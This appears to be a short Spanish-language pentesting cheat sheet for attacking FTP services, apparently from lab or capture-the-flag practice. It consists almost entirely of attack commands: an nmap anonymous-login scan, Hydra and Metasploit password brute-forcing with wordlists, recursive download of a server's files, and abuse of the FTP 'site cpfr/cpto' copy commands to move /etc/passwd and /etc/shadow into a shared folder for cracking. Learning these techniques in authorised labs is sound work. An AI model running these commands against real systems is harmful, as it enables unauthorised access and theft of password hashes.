### Escaneo vulnerabilidades FTP
```bash
nmap <ip> -p <puerto> -n -Pn --script=ftp-anon
```
###  Fuerza bruta FTP con Hydra

```bash
# Cuando tengo el usuario y quiero sacar la contraseña
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10

# Cuando tengo una contraseña y quiero sacar el usuario
hydra -L /usr/share/wordlists/metasploit/unix_users.txt <usuario> -p password123 ftp://10.10.10.10
```

* -l minúscula especifica un usuario en concreto
* -L mayúscila especifica un diccionario de usuarios
* -p minúscula (mismo para contraseñas)
* -P mayúscula (mismo para  contraseñas)

### Fuerza bruta FTP con Metasploit
```bash
# search ftp_login, seleccionamos auxiliary/scanner/ftp/ftp_login
	Completamos los datos necesarios y "run"
```

### Descargar de forma recursiva todo de un FTP
```bash
wget -r ftp://"<user>":"<pass>"@ip
```

### Vulnerabilidad File Copy
En cierta version de FTP podemos copiar ficheros entre directorios de la máquina. Esto interesa cuando se combina con que tenemos un SMB y podemos acceder a los recursos compartidos.

Podemos copiar los ficheros **passwd** y **shadow** al directorio del recurso compartido y descargarlo para crackearlo. El funcionamiento es el siguiente:

```bash
# Intentamos un login (aunque sea falso), dará error pero recibiremos un prompt

ftp usuario@ip

#Ahora hacemos la magia
site cpfr /etc/passwd
site cpto /home/aeolus/shared/passwd
site cpfr /etc/shadow
site cpto /home/aeolus/shared/shadow
```









